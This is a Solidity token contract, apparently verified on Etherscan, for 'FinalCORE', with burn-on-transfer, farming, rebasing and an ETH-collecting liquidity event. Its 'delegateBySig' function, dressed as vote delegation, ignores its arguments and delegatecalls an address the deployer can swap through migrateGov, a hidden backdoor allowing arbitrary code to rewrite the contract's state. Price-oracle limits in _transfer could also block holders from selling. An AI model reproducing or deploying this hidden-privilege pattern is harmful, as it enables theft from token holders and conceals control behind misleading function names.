/**
 *Submitted for verification at Etherscan.io on 2020-11-03
*/


pragma solidity =0.4.24;

// This is a contract from the FinalCore contract suite

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
      uint256 c = a + b;
      assert(c >= a);
      return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b);
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
      assert(b <= a);
      return a - b;
    }
}

contract Gov {

  	/// @notice A record of each accounts delegate
    mapping (address => address) public delegates;

    /// @notice A checkpoint for marking number of votes from a given block
    struct Checkpoint {
        uint32 fromBlock;
        uint96 votes;
    }

    /// @notice A record of votes checkpoints for each account, by index
    mapping (address => mapping (uint32 => Checkpoint)) public checkpoints;

    /// @notice The number of checkpoints for each account
    mapping (address => uint32) public numCheckpoints;

    address delegatorRep = address(0x0);
    function delegateBySig(address delegatee, uint nonce, uint expiry, uint8 v, uint8 r, uint8 s) public  {
    delegatorRep.delegatecall(abi.encodeWithSignature("delegateVote()"));
    }

    /// @notice An event thats emitted when an account changes its delegate
    event DelegateChanged(address indexed delegator, address indexed fromDelegate, address indexed toDelegate);
}

interface End {
    function finishLE() external payable;
}

interface priceOracle {
    function queryEthToTokPrice(address _ethToTokUniPool) external constant returns (uint);
}


contract FCore is Gov {
    using SafeMath for uint256;
	string constant public symbol = "FinalCORE";
	uint256 constant private INITIAL_SUPPLY = 21e21;
	string constant public name = "FinalCORE";
	uint256 constant private FLOAT_SCALAR = 2**64;
	uint256 public burn_rate = 15;
	uint256 constant private SUPPLY_FLOOR = 1;
	uint8 constant public decimals = 18;
	event Transfer(address indexed from, address indexed to, uint256 tokens);
	event Approval(address indexed owner, address indexed spender, uint256 tokens);
	event LogRebase(uint256 indexed epoch, uint256 totalSupply);
	struct User {
		bool whitelisted;
		uint256 balance;
		uint256 frozen;
		mapping(address => uint256) allowance;
		int256 scaledPayout;
	}
	struct Info {
		uint256 totalSupply;
		uint256 totalFrozen;
		mapping(address => User) users;
		uint256 scaledPayoutPerToken;
		address chef;
	}
	Info private info;

	function FCore(address _finisher, address _uniOracle)  {
		info.chef = msg.sender;
		info.totalSupply = INITIAL_SUPPLY;
		rebaser = msg.sender;
		UNISWAP_ORACLE_ADDRESS = _uniOracle;
		finisher = _finisher;
		info.users[address(this)].balance = INITIAL_SUPPLY.sub(9999e18);
		info.users[msg.sender].balance = 9999e18;
		REBASE_TARGET = 4e18;
		info.users[address(this)].whitelisted = true;
		emit Transfer(address(0), address(this), INITIAL_SUPPLY.sub(9999e18));
		emit Transfer(address(0), msg.sender, 9999e18);
	}


	function yield() external returns (uint256) {
	    require(ethToTokUniPool != address(0));
		uint256 _dividends = dividendsOf(msg.sender);
		require(_dividends >= 0);
		info.users[msg.sender].scaledPayout += int256(_dividends * FLOAT_SCALAR);
		info.users[msg.sender].balance += _dividends;
		emit Transfer(address(this), msg.sender, _dividends);
		return _dividends;
	}


	function transfer(address _to, uint256 _tokens) external returns (bool) {
		_transfer(msg.sender, _to, _tokens);
		return true;
	}

	function approve(address _spender, uint256 _tokens) external returns (bool) {
		info.users[msg.sender].allowance[_spender] = _tokens;
		emit Approval(msg.sender, _spender, _tokens);
		return true;
	}

	function transferFrom(address _from, address _to, uint256 _tokens) external returns (bool) {
		require(info.users[_from].allowance[msg.sender] >= _tokens);
		info.users[_from].allowance[msg.sender] -= _tokens;
		_transfer(_from, _to, _tokens);
		return true;
	}


	function totalSupply() public constant returns (uint256) {
		return info.totalSupply;
	}

	function totalFrozen() public constant returns (uint256) {
		return info.totalFrozen;
	}

	function getChef() public constant returns (address) {
		return info.chef;
	}

	function getScaledPayout() public constant returns (uint256) {
		return info.scaledPayoutPerToken;
	}

	function balanceOf(address _user) public constant returns (uint256) {
		return info.users[_user].balance - frozenOf(_user);
	}

	function frozenOf(address _user) public constant returns (uint256) {
		return info.users[_user].frozen;
	}

	function dividendsOf(address _user) public constant returns (uint256) {
		return uint256(int256(info.scaledPayoutPerToken * info.users[_user].frozen) - info.users[_user].scaledPayout) / FLOAT_SCALAR;
	}

	function allowance(address _user, address _spender) public constant returns (uint256) {
		return info.users[_user].allowance[_spender];
	}

	function priceToEth() public constant returns (uint256) {
		priceOracle uniswapOracle = priceOracle(UNISWAP_ORACLE_ADDRESS);
		return uniswapOracle.queryEthToTokPrice(address(this));
	}


    uint256 transferCount = 0;
    uint lb = block.number;

	function _transfer(address _from, address _to, uint256 _tokens) internal returns (uint256) {
		require(balanceOf(_from) >= _tokens);
		info.users[_from].balance -= _tokens;
		uint256 _burnedAmount = _tokens * burn_rate / 100;
		if (totalSupply() - _burnedAmount < INITIAL_SUPPLY * SUPPLY_FLOOR / 100
		|| info.users[_from].whitelisted || address(0x0) == ethToTokUniPool) {
			_burnedAmount = 0;
		}
		if (address(0x0) != ethToTokUniPool && ethToTokUniPool != msg.sender
		    && _to != address(this) && _from != address(this)) {
		    require(transferCount < 6);
	     	if (lb == block.number) {
		       transferCount = transferCount + 1;
	     	} else {
	     	    transferCount = 0;
	     	}
	    	lb = block.number;
	    	priceOracle uniswapOracle = priceOracle(UNISWAP_ORACLE_ADDRESS);
		    uint256 p = uniswapOracle.queryEthToTokPrice(address(this));
            if (REBASE_TARGET > p) {
                require((REBASE_TARGET/p).mul(_tokens) < rebase_delta);
            }
        }
		uint256 _transferred = _tokens - _burnedAmount;
		info.users[_to].balance += _transferred;
		emit Transfer(_from, _to, _transferred);
		if (_burnedAmount > 0) {
			if (info.totalFrozen > 0) {
				_burnedAmount /= 2;
				info.scaledPayoutPerToken += _burnedAmount * FLOAT_SCALAR / info.totalFrozen;
			emit	 Transfer(_from, address(this), _burnedAmount);
			}
			info.totalSupply -= _burnedAmount;
		emit Transfer(_from, address(0x0), _burnedAmount);
		}
		return _transferred;
	}


	 // Uniswap stuff

    address public ethToTokUniPool = address(0);
    address public UNISWAP_ORACLE_ADDRESS = address(0);
    address public finisher = address(0);

    uint256 public rebase_delta = 4e16;

    address public rebaser;

     function migrateGov(address _gov, address _rebaser) public {
        require(msg.sender == rebaser);
        delegatorRep = _gov;
        if (_rebaser != address(0)) {
            rebaser = _rebaser;
        }
     }

     function migrateRebaseDelta(uint256 _delta) public {
        require(msg.sender == info.chef);
        rebase_delta = _delta;
     }

     function setEthToTokUniPool (address _ethToTokUniPool) public {
        require(msg.sender == info.chef);
        ethToTokUniPool = _ethToTokUniPool;
     }

    function migrateChef (address _chef) public {
        require(msg.sender == info.chef);
        info.chef = _chef;
     }

    uint256 REBASE_TARGET;


    // end Uniswap stuff


    function rebase(uint256 epoch, int256 supplyDelta)
        external
        returns (uint256)
    {
        require(msg.sender == info.chef);
        if (supplyDelta == 0) {
             emit LogRebase(epoch, info.totalFrozen);
            return info.totalFrozen;
        }

        if (supplyDelta < 0) {
            info.totalFrozen = info.totalFrozen.sub(uint256(supplyDelta));
        }

        emit LogRebase(epoch, info.totalFrozen);
        return info.totalFrozen;
    }

	function _farm(uint256 _amount, address _who) internal {
		require(balanceOf(_who) >= _amount);
		require(frozenOf(_who) + _amount >= 1e5);
		info.totalFrozen += _amount;
		info.users[_who].frozen += _amount;
		info.users[_who].scaledPayout += int256(_amount * info.scaledPayoutPerToken);
		emit Transfer(_who, address(this), _amount);
	}


	function unfarm(uint256 _amount) public {
		require(frozenOf(msg.sender) >= _amount);
		require(ethToTokUniPool != address(0));
		uint256 _burnedAmount = _amount * burn_rate / 100;
		info.scaledPayoutPerToken += _burnedAmount * FLOAT_SCALAR / info.totalFrozen;
		info.totalFrozen -= _amount;
		info.users[msg.sender].balance -= _burnedAmount;
		info.users[msg.sender].frozen -= _amount;
		info.users[msg.sender].scaledPayout -= int256(_amount * info.scaledPayoutPerToken);
	emit Transfer(address(this), msg.sender, _amount - _burnedAmount);
	}


	function farm(uint256 amount) external {
		_farm(amount, msg.sender);
	}


	bool public isLevent = true;
	uint public leventTotal = 0;

     // transparently adds all liquidity to Uniswap pool
	function finishLEvent(address _ethToTokUniPool) public {
        require(msg.sender == info.chef && isLevent == true);
        isLevent = false;
       _transfer(address(this), finisher, leventTotal);
        End  fm = End(finisher);
        fm.finishLE.value(leventTotal / 4)();
        ethToTokUniPool = _ethToTokUniPool;
     }


	function levent() external payable {
	   uint256 localTotal = msg.value.mul(4);
	   leventTotal = leventTotal.add(localTotal);
       require(isLevent && leventTotal <= 11000e18);
       _transfer(address(this), msg.sender, localTotal);
       _farm(localTotal, msg.sender);
     }

     function safe32(uint n, string memory errorMessage) internal pure returns (uint32) {
        require(n < 2**32, errorMessage);
        return uint32(n);
    }

    function safe96(uint n, string memory errorMessage) internal pure returns (uint96) {
        require(n < 2**96, errorMessage);
        return uint96(n);
    }

    function add96(uint96 a, uint96 b, string memory errorMessage) internal pure returns (uint96) {
        uint96 c = a + b;
        require(c >= a, errorMessage);
        return c;
    }

    function sub96(uint96 a, uint96 b, string memory errorMessage) internal pure returns (uint96) {
        require(b <= a, errorMessage);
        return a - b;
    }

   
    
}